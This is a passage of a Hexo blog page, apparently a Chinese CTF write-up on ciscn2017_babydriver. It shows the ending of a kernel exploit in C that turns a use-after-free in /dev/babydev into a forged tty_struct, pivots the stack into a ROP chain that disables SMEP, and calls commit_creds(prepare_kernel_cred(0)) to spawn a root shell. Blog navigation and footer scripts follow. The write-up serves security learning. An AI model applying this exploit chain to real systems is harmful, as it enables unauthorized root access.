*(*pkc)(<span class="type">int</span>) = (<span class="type">void</span> *(*)(<span class="type">int</span>))PREPARE_KERNEL_CRED;  </span><br><span class="line">   <span class="type">void</span> (*cc)(<span class="type">void</span> *) = (<span class="type">void</span> (*)(<span class="type">void</span> *))COMMIT_CREDS;  </span><br><span class="line">   <span class="comment">//commit_creds(prepare_kernel_cred(0))  </span></span><br><span class="line">   (*cc)((*pkc)(<span class="number">0</span>));  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span> &#123;  </span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;  </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Rooted!!\n&quot;</span>);  </span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);  </span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Root Fail!!\n&quot;</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">size_t</span> user_cs,user_ss,user_flags,user_sp;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/*保存用户态的寄存器到变量里*/</span>  </span><br><span class="line"><span class="type">void</span> <span class="title function_">saveUserState</span><span class="params">()</span> &#123;  </span><br><span class="line">   __asm__(<span class="string">&quot;mov %cs,user_cs;&quot;</span>  </span><br><span class="line">           <span class="string">&quot;mov %ss,user_ss;&quot;</span>  </span><br><span class="line">           <span class="string">&quot;mov %rsp,user_sp;&quot;</span>  </span><br><span class="line">           <span class="string">&quot;pushf;&quot;</span>  </span><br><span class="line">           <span class="string">&quot;pop user_flags;&quot;</span>  </span><br><span class="line">           );  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;user states have been saved!!&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">   <span class="comment">//保存用户态寄存器  </span></span><br><span class="line">   saveUserState();  </span><br><span class="line">   <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);  </span><br><span class="line">   <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);  </span><br><span class="line">   <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span> || fd2 &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);  </span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="comment">//申请一个tty_struct大小的堆  </span></span><br><span class="line">   ioctl(fd1,<span class="number">0x10001</span>,TTY_STRUCT_SIZE);  </span><br><span class="line">   <span class="comment">//释放这个堆  </span></span><br><span class="line">   close(fd1);  </span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x100</span>];  </span><br><span class="line">   <span class="type">int</span> i = <span class="number">0</span>;  </span><br><span class="line">   rop[i++] = POP_RDI;  </span><br><span class="line">   rop[i++] = <span class="number">0x6f0</span>;  </span><br><span class="line">   rop[i++] = MOV_CR4_RDI;  </span><br><span class="line">   rop[i++] = <span class="number">0</span>;  </span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getRoot;  </span><br><span class="line">   rop[i++] = SWAPGS;  </span><br><span class="line">   rop[i++] = <span class="number">0</span>;  </span><br><span class="line">   rop[i++] = IRETQ;  </span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getShell;  </span><br><span class="line">   rop[i++] = user_cs;  </span><br><span class="line">   rop[i++] = user_flags;  </span><br><span class="line">   rop[i++] = user_sp;  </span><br><span class="line">   rop[i++] = user_ss;  </span><br><span class="line">  </span><br><span class="line">   <span class="type">size_t</span> fake_tty_operations[<span class="number">35</span>];  </span><br><span class="line">   <span class="comment">/*for (int i=0;i&lt;35;i++) &#123; </span></span><br><span class="line"><span class="comment">      fake_tty_operations[i] = 0xffffffffc0000000 + i; </span></span><br><span class="line"><span class="comment">   &#125;*/</span>  </span><br><span class="line">   <span class="comment">//这个位置是write函数的指针，经过调试，我们发现当调用这个函数时，rax正好是fake_tty_operation的地址，于是，我们把栈转移到  </span></span><br><span class="line">   <span class="comment">//fake_tty_operations里  </span></span><br><span class="line">   fake_tty_operations[<span class="number">7</span>] = MOV_RSP_RAX;  </span><br><span class="line">   <span class="comment">//栈转移到fake_tty_operations里后，我们继续做一次转移，把转转移到我们的rop数组里，执行ROP  </span></span><br><span class="line">   fake_tty_operations[<span class="number">0</span>] = POP_RAX;  </span><br><span class="line">   fake_tty_operations[<span class="number">1</span>] = (<span class="type">size_t</span>)rop;  </span><br><span class="line">   fake_tty_operations[<span class="number">2</span>] = MOV_RSP_RAX;  </span><br><span class="line">  </span><br><span class="line">   <span class="type">size_t</span> fake_tty_struct[<span class="number">4</span>];  </span><br><span class="line">   <span class="comment">//这个操作会申请tty_struct的空间，也就是会申请到我们之前释放的那个堆里，我们可以用fd2来对它操作  </span></span><br><span class="line">   <span class="type">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);  </span><br><span class="line">   <span class="comment">//我们先把原始的tty_struct前面的数据读出来，存储  </span></span><br><span class="line">   read(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);  </span><br><span class="line">   <span class="comment">//修改const struct tty_operations *ops;指针，指向我们伪造的tty_operations  </span></span><br><span class="line">   fake_tty_struct[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_tty_operations;  </span><br><span class="line">   <span class="comment">//把篡改过的tty_struct写回去  </span></span><br><span class="line">   write(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);  </span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x10</span>];  </span><br><span class="line">   write(fd_tty,buf,<span class="number">0x10</span>);  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<img src="/ha1vk/2020/02/29/linux_kernel_pwn_tty_struct/image3.JPG" class="">
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/ROP/" rel="tag"># ROP</a>
+              <a href="/ha1vk/tags/UAF/" rel="tag"># UAF</a>
+              <a href="/ha1vk/tags/Linux-Kernel/" rel="tag"># Linux Kernel</a>
+              <a href="/ha1vk/tags/tty-struct/" rel="tag"># tty_struct</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/02/29/linux_kernel_pwn_UAF/" rel="prev" title="linux kernel pwn学习之UAF">
+      <i class="fa fa-chevron-left"></i> linux kernel pwn学习之UAF
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/03/01/linux_kernel_pwn_heap_bypass_smap_smep/" rel="next" title="linux kernel pwn学习之堆漏洞利用+bypass smap、smep">
+      linux kernel pwn学习之堆漏洞利用+bypass smap、smep <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ciscn2017-babydriver"><span class="nav-number">1.</span> <span class="nav-text">ciscn2017_babydriver</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
